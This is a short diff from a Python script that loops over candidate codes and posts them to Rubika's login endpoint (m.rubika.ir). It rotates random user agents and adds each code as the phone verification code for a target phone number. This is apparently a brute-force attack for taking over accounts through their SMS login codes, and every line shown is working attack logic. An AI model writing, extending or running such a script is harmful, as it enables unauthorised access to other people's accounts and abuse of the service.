@@ -148,7 +148,7 @@ print ('\n'*5)
 while True:
     for code in codes:
         headers2 = {'Host':'https://m.rubika.ir','User-Agent': pyuseragents.random(),'Accept':'application/json, text/plain, */*','content-length':'95','Content-Type':'application/json'}
-        data = {"status":"OK","status_det":"OK","index":"0", "landscape":"false" ,"submit":"ورود", "_ga":"GA1.2.136.9312509.165.075.9611","_gid":"GA1.2.851086128.1656235386", "data":{"phone_number": number, "phone_code_hash": code}}
+        data = {"status":"OK","status_det":"OK","index":"0", "landscape":"false" ,"submit":"ورود", "_ga":"GA1.2.136.9312509.165.075.9611","_gid":"GA1.2.851086128.1656235386", "data":{"phone_number": number, "phone_code_hash": code , 'phone_code': code}}
         try:
             time.sleep(1)
             def send():
